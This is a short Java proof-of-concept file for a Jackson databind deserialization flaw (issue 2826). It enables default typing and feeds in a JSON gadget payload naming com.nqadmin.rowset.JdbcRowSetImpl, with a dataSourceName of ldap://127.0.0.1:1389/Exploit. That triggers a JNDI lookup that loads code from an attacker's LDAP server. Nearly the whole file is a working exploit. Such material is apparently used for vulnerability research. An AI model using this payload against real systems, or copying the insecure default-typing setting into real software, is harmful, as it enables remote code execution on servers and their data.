import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

//https://github.com/FasterXML/jackson-databind/issues/2826
public class jdbcrowsetimpl {
    public static void main(String[] args) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String json = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";
        Object obj = mapper.readValue(json, Object.class);
    }
}
